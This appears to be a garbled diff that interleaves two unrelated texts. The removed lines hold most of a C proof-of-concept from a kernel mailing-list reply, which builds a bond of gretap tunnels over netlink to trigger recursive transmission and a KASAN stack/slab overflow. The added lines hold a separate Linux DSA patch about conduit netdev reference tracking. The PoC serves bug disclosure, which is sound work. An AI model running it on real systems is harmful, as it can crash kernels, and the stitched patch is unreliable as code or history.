-    printf("  addr %s %s/%d: %s\n", dev, addr_str, prefix, ret ? strerror(errno) : "ok");
-    return ret;
-}
+That is to say, the new probing paths were never quite correct in this
+area.
 
-static int add_addr6(int sock, struct nlmsg *nlmsg, const char *dev,
-                     const char *addr_str, int prefix)
-{
-    struct ifaddrmsg hdr = {};
-    hdr.ifa_family = AF_INET6;
-    hdr.ifa_prefixlen = prefix;
-    hdr.ifa_scope = RT_SCOPE_UNIVERSE;
-    hdr.ifa_index = if_nametoindex(dev);
-    struct in6_addr addr;
-    inet_pton(AF_INET6, addr_str, &addr);
-    nl_init(nlmsg, RTM_NEWADDR, NLM_F_CREATE | NLM_F_REPLACE, &hdr, sizeof(hdr));
-    nl_attr(nlmsg, IFA_LOCAL, &addr, sizeof(addr));
-    nl_attr(nlmsg, IFA_ADDRESS, &addr, sizeof(addr));
-    int ret = nl_send(nlmsg, sock);
-    printf("  addr6 %s %s/%d: %s\n", dev, addr_str, prefix, ret ? strerror(errno) : "ok");
-    return ret;
-}
+The existence of the legacy probing support which was deleted in 2019
+explains why dsa_dev_to_net_device() returns a conduit with elevated
+refcount (because it was supposed to be released during
+dsa_remove_dst()). After the removal of the legacy code, the only user
+of dsa_dev_to_net_device() calls dev_put(conduit) immediately after this
+function returns. This pattern makes no sense today, and can only be
+interpreted historically to understand why dev_hold() was there in the
+first place.
 
-static int create_veth(int sock, struct nlmsg *nlmsg, const char *name,
-                       const char *peer)
-{
-    struct ifinfomsg hdr = {};
-    nl_init(nlmsg, RTM_NEWLINK, NLM_F_EXCL | NLM_F_CREATE, &hdr, sizeof(hdr));
-    nl_attr(nlmsg, IFLA_IFNAME, name, strlen(name) + 1);
-    nl_nest(nlmsg, IFLA_LINKINFO);
-    nl_attr(nlmsg, IFLA_INFO_KIND, "veth", 4);
-    nl_nest(nlmsg, IFLA_INFO_DATA);
-    nl_nest(nlmsg, 1 /* VETH_INFO_PEER */);
-    nlmsg->pos += sizeof(struct ifinfomsg);
-    nl_attr(nlmsg, IFLA_IFNAME, peer, strlen(peer) + 1);
-    nl_done(nlmsg);
-    nl_done(nlmsg);
-    nl_done(nlmsg);
-    int ret = nl_send(nlmsg, sock);
-    printf("  create veth %s<->%s: %s\n", name, peer, ret ? strerror(errno) : "ok");
-    return ret;
-}
+Change details
+--------------
 
-static int add_neigh4(int sock, struct nlmsg *nlmsg, const char *dev,
-                      const char *addr_str, const unsigned char *mac)
-{
-    struct ndmsg hdr = {};
-    hdr.ndm_family = AF_INET;
-    hdr.ndm_ifindex = if_nametoindex(dev);
-    hdr.ndm_state = NUD_PERMANENT;
-    hdr.ndm_type = 0;
-    nl_init(nlmsg, RTM_NEWNEIGH, NLM_F_CREATE | NLM_F_REPLACE, &hdr, sizeof(hdr));
-    struct in_addr addr;
-    inet_pton(AF_INET, addr_str, &addr);
-    nl_attr(nlmsg, NDA_DST, &addr, sizeof(addr));
-    nl_attr(nlmsg, NDA_LLADDR, mac, 6);
-    int ret = nl_send(nlmsg, sock);
-    printf("  neigh %s %s: %s\n", dev, addr_str, ret ? strerror(errno) : "ok");
-    return ret;
-}
+Today we have a better netdev tracking infrastructure which we should
+use. Logically netdev_hold() belongs in common code
+(dsa_port_parse_cpu(), where dp->conduit is assigned), but there is a
+tradeoff to be made with the rtnl_lock() section which would become a
+bit too long if we did that - dsa_port_parse_cpu() also calls
+request_module(). So we duplicate a bit of logic in order for the
+callers of dsa_port_parse_cpu() to be the ones responsible of holding
+the conduit reference and releasing it on error. This shortens the
+rtnl_lock() section significantly.
 
-// Debug: check if routing to dst works through devname
-static void debug_route(const char *devname, const char *dst_str)
-{
-    int fd = socket(AF_INET, SOCK_DGRAM, 0);
-    if (fd < 0) { perror("  debug: socket"); return; }
+In the dsa_switch_probe() error path, dsa_switch_release_ports() will be
+called in a number of situations, one being where dsa_port_parse_cpu()
+maybe didn't get the chance to run at all (a different port failed
+earlier, etc). So we have to test for the conduit being NULL prior to
+calling netdev_put().
 
-    if (setsockopt(fd, SOL_SOCKET, 25 /* SO_BINDTODEVICE */,
-                   devname, strlen(devname) + 1) < 0) {
-        printf("  debug: SO_BINDTODEVICE %s: %s\n", devname, strerror(errno));
-    }
+There have still been so many transformations to the code since the
+blamed commits (rename master -> conduit, commit 0650bf52b31f ("net:
+dsa: be compatible with masters which unregister on shutdown")), that it
+only makes sense to fix the code using the best methods available today
+and see how it can be backported to stable later. I suspect the fix
+cannot even be backported to kernels which lack dsa_switch_shutdown(),
+and I suspect this is also maybe why the long-lived conduit reference
+didn't make it into the new DSA probing paths at the time (problems
+during shutdown).
 
-    struct sockaddr_in dst = {};
-    dst.sin_family = AF_INET;
-    dst.sin_port = htons(9999);
-    inet_pton(AF_INET, dst_str, &dst.sin_addr);
+Because dsa_dev_to_net_device() has a single call site and has to be
+changed anyway, the logic was just absorbed into the non-OF
+dsa_port_parse().
 
-    if (connect(fd, (struct sockaddr *)&dst, sizeof(dst)) < 0) {
-        printf("  debug: connect to %s via %s: %s\n", dst_str, devname, strerror(errno));
-    } else {
-        struct sockaddr_in local = {};
-        socklen_t len = sizeof(local);
-        getsockname(fd, (struct sockaddr *)&local, &len);
-        char local_str[32];
-        inet_ntop(AF_INET, &local.sin_addr, local_str, sizeof(local_str));
-        printf("  debug: route to %s via %s OK, local=%s\n", dst_str, devname, local_str);
+Tested on the ocelot/felix switch and on dsa_loop, both on the NXP
+LS1028A with CONFIG_DEBUG_KOBJECT_RELEASE=y.
 
-        // Try to actually send a packet
-        char buf[64] = "test";
-        ssize_t n = send(fd, buf, sizeof(buf), MSG_DONTWAIT);
-        printf("  debug: send: %zd (%s)\n", n, n < 0 ? strerror(errno) : "ok");
-    }
-    close(fd);
-}
+Reported-by: Ma Ke <make24@iscas.ac.cn>
+Closes: https://lore.kernel.org/netdev/20251214131204.4684-1-make24@iscas.ac.cn/
+Fixes: 83c0afaec7b7 ("net: dsa: Add new binding implementation")
+Fixes: 71e0bbde0d88 ("net: dsa: Add support for platform data")
+Reviewed-by: Jonas Gorski <jonas.gorski@gmail.com>
+Signed-off-by: Vladimir Oltean <vladimir.oltean@nxp.com>
+Link: https://patch.msgid.link/20251215150236.3931670-1-vladimir.oltean@nxp.com
+Signed-off-by: Paolo Abeni <pabeni@redhat.com>
+Signed-off-by: Robert Garcia <rob_garcia@163.com>
+---
+ include/net/dsa.h |  1 +
+ net/dsa/dsa.c     | 59 +++++++++++++++++++++++++++--------------------
+ 2 files changed, 35 insertions(+), 25 deletions(-)
 
-// Send a multicast packet through bond0 to actively trigger the recursive path
-static void trigger_multicast(const char *devname)
-{
-    int fd = socket(AF_INET, SOCK_DGRAM, 0);
-    if (fd < 0) {
-        perror("  trigger: socket");
-        return;
-    }
+diff --git a/include/net/dsa.h b/include/net/dsa.h
+index 877f9b270cf6..a1f730d9f01b 100644
+--- a/include/net/dsa.h
++++ b/include/net/dsa.h
+@@ -296,6 +296,7 @@ struct dsa_port {
+ 	struct devlink_port	devlink_port;
+ 	struct phylink		*pl;
+ 	struct phylink_config	pl_config;
++	netdevice_tracker	conduit_tracker;
+ 	struct dsa_lag		*lag;
+ 	struct net_device	*hsr_dev;
+ 
+diff --git a/net/dsa/dsa.c b/net/dsa/dsa.c
+index 76a086e846c4..95f87e1f90af 100644
+--- a/net/dsa/dsa.c
++++ b/net/dsa/dsa.c
+@@ -1246,14 +1246,25 @@ static int dsa_port_parse_of(struct dsa_port *dp, struct device_node *dn)
+ 	if (ethernet) {
+ 		struct net_device *conduit;
+ 		const char *user_protocol;
++		int err;
+ 
++		rtnl_lock();
+ 		conduit = of_find_net_device_by_node(ethernet);
+ 		of_node_put(ethernet);
+-		if (!conduit)
++		if (!conduit) {
++			rtnl_unlock();
+ 			return -EPROBE_DEFER;
++		}
++
++		netdev_hold(conduit, &dp->conduit_tracker, GFP_KERNEL);
++		put_device(&conduit->dev);
++		rtnl_unlock();
+ 
+ 		user_protocol = of_get_property(dn, "dsa-tag-protocol", NULL);
+-		return dsa_port_parse_cpu(dp, conduit, user_protocol);
++		err = dsa_port_parse_cpu(dp, conduit, user_protocol);
++		if (err)
++			netdev_put(conduit, &dp->conduit_tracker);
++		return err;
+ 	}
+ 
+ 	if (link)
+@@ -1386,37 +1397,30 @@ static struct device *dev_find_class(struct device *parent, char *class)
+ 	return device_find_child(parent, class, dev_is_class);
+ }
+ 
+-static struct net_device *dsa_dev_to_net_device(struct device *dev)
+-{
+-	struct device *d;
+-
+-	d = dev_find_class(dev, "net");
+-	if (d != NULL) {
+-		struct net_device *nd;
+-
+-		nd = to_net_dev(d);
+-		dev_hold(nd);
+-		put_device(d);
+-
+-		return nd;
+-	}
+-
+-	return NULL;
+-}
+-
+ static int dsa_port_parse(struct dsa_port *dp, const char *name,
+ 			  struct device *dev)
+ {
+ 	if (!strcmp(name, "cpu")) {
+ 		struct net_device *conduit;
++		struct device *d;
++		int err;
+ 
+-		conduit = dsa_dev_to_net_device(dev);
+-		if (!conduit)
++		rtnl_lock();
++		d = dev_find_class(dev, "net");
++		if (!d) {
++			rtnl_unlock();
+ 			return -EPROBE_DEFER;
++		}
+ 
+-		dev_put(conduit);
++		conduit = to_net_dev(d);
++		netdev_hold(conduit, &dp->conduit_tracker, GFP_KERNEL);
++		put_device(d);
++		rtnl_unlock();
+ 
+-		return dsa_port_parse_cpu(dp, conduit, NULL);
++		err = dsa_port_parse_cpu(dp, conduit, NULL);
++		if (err)
++			netdev_put(conduit, &dp->conduit_tracker);
++		return err;
+ 	}
+ 
+ 	if (!strcmp(name, "dsa"))
+@@ -1484,6 +1488,9 @@ static void dsa_switch_release_ports(struct dsa_switch *ds)
+ 	struct dsa_vlan *v, *n;
+ 
+ 	dsa_switch_for_each_port_safe(dp, next, ds) {
++		if (dsa_port_is_cpu(dp) && dp->conduit)
++			netdev_put(dp->conduit, &dp->conduit_tracker);
++
+ 		/* These are either entries that upper layers lost track of
+ 		 * (probably due to bugs), or installed through interfaces
+ 		 * where one does not necessarily have to remove them, like
+@@ -1636,8 +1643,10 @@ void dsa_switch_shutdown(struct dsa_switch *ds)
+ 	/* Disconnect from further netdevice notifiers on the conduit,
+ 	 * since netdev_uses_dsa() will now return false.
+ 	 */
+-	dsa_switch_for_each_cpu_port(dp, ds)
++	dsa_switch_for_each_cpu_port(dp, ds) {
+ 		dp->conduit->dsa_ptr = NULL;
++		netdev_put(dp->conduit, &dp->conduit_tracker);
++	}
+ 
+ 	rtnl_unlock();
+ out:
+-- 
+2.34.1
 
-    // Bind to device
-    if (setsockopt(fd, SOL_SOCKET, 25 /* SO_BINDTODEVICE */,
-                   devname, strlen(devname) + 1) < 0) {
-        perror("  trigger: SO_BINDTODEVICE");
-    }
-
-    // Set multicast TTL
-    int ttl = 1;
-    setsockopt(fd, IPPROTO_IP, 33 /* IP_MULTICAST_TTL */, &ttl, sizeof(ttl));
-
-    // Send to multicast address 224.0.0.1 (all-hosts)
-    struct sockaddr_in dst = {};
-    dst.sin_family = AF_INET;
-    dst.sin_port = htons(9999);
-    inet_pton(AF_INET, "224.0.0.1", &dst.sin_addr);
-
-    char buf[64] = "trigger";
-    for (int i = 0; i < 10; i++) {
-        if (sendto(fd, buf, sizeof(buf), 0,
-                   (struct sockaddr *)&dst, sizeof(dst)) < 0) {
-            printf("  trigger: sendto #%d: %s\n", i, strerror(errno));
-        } else {
-            printf("  trigger: sent multicast #%d\n", i);
-        }
-        usleep(100000);
-    }
-    close(fd);
-}
-
-int main(int argc, char *argv[])
-{
-    printf("[*] PoC: KASAN slab-out-of-bounds Write in __build_flow_key\n");
-    printf("[*] uid=%d euid=%d\n", getuid(), geteuid());
-
-    int sock = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
-    if (sock < 0) {
-        perror("socket(NETLINK_ROUTE)");
-        return 1;
-    }
-
-    struct nlmsg nlmsg;
-    struct in_addr remote;
-    inet_pton(AF_INET, "10.1.1.2", &remote);
-    unsigned char fake_mac[6] = {0x00, 0x11, 0x22, 0x33, 0x44, 0x55};
-
-    // Bring up loopback first
-    printf("[*] Step 0: Bring up loopback...\n");
-    dev_updown(sock, &nlmsg, "lo", 1);
-
-    printf("[*] Step 1: Create bond0 in broadcast mode (mode 3)...\n");
-    create_bond(sock, &nlmsg, "bond0", 3);
-
-    printf("[*] Step 2: Bring bond0 UP and assign IPv4...\n");
-    dev_updown(sock, &nlmsg, "bond0", 1);
-    add_addr4(sock, &nlmsg, "bond0", "10.1.1.1", 24);
-
-    // Create MULTIPLE gretap tunnels, each with a DIFFERENT remote address.
-    // All remotes are in the 10.1.1.0/24 subnet (reachable through bond0).
-    // With broadcast mode, bond sends to all slaves. Each gretap has its OWN
-    // qdisc instances (pfifo_fast with TCQ_F_NOLOCK). When bond recurses:
-    // - Level 0: gretap1's qdisc runs → tunnel → back to bond
-    // - Level 1: gretap1 blocked (running), gretap2 runs → tunnel → bond
-    // - Level 2: gretap1,2 blocked, gretap3 runs → tunnel → bond
-    // - Level 3: gretap1,2,3 blocked, gretap4 runs → tunnel → bond
-    // Each level adds ~8-12KB of stack (with KASAN_STACK). With 32KB stack
-    // (KASAN doubles it), 4 levels = ~40-50KB → overflow!
-    // Pre-populate ARP entries BEFORE enslaving gretap devices.
-    // This ensures that when IGMP/NDP is triggered by enslaving, the
-    // outer GRE packets can be sent immediately (no ARP resolution queue).
-    printf("[*] Step 3: Pre-populate ARP entries for all remotes...\n");
-    int num_gretaps = 7;
-    char gname[16], remote_str[32];
-    for (int i = 0; i < num_gretaps; i++) {
-        snprintf(remote_str, sizeof(remote_str), "10.1.1.%d", i + 2);
-        fake_mac[5] = 0x55 + i;
-        add_neigh4(sock, &nlmsg, "bond0", remote_str, fake_mac);
-    }
-
-    printf("[*] Step 4: Create 4 gretap tunnels (different remotes, 9 txq each)...\n");
-    for (int i = 0; i < num_gretaps; i++) {
-        snprintf(gname, sizeof(gname), "gretap%d", i + 1);
-        snprintf(remote_str, sizeof(remote_str), "10.1.1.%d", i + 2);
-        inet_pton(AF_INET, remote_str, &remote);
-        create_gretap(sock, &nlmsg, gname, remote.s_addr, 9);
-    }
-
-    printf("[*] Step 5: Enslave all gretaps to bond0 and bring up...\n");
-    for (int i = 0; i < num_gretaps; i++) {
-        snprintf(gname, sizeof(gname), "gretap%d", i + 1);
-        set_master(sock, &nlmsg, gname, "bond0");
-        dev_updown(sock, &nlmsg, gname, 1);
-    }
-
-    printf("[*] Step 6: Trigger - Add IPv6 address (triggers DAD through bond)...\n");
-    // DAD sends NDP through all slaves → gretap → tunnel → bond → recursion
-    add_addr6(sock, &nlmsg, "bond0", "fd00::1", 64);
-    sleep(3);
-
-    printf("[*] Step 7: Toggle bond0 to retrigger IGMP/MLD...\n");
-    dev_updown(sock, &nlmsg, "bond0", 0);
-    usleep(200000);
-    dev_updown(sock, &nlmsg, "bond0", 1);
-    add_neigh4(sock, &nlmsg, "bond0", "10.1.1.2", fake_mac);
-    add_addr6(sock, &nlmsg, "bond0", "fd01::1", 64);
-    sleep(3);
-
-    printf("[*] Step 8: Send multicast packets through bond0...\n");
-    trigger_multicast("bond0");
-
-    printf("[*] Done. Check dmesg for KASAN report.\n");
-    sleep(5);
-    close(sock);
-    return 0;
-}
-```
-
-Please let me know if it doesn't trigger the bug.
-
-Thanks,
-Xiang
-> 
-> Thanks.
 
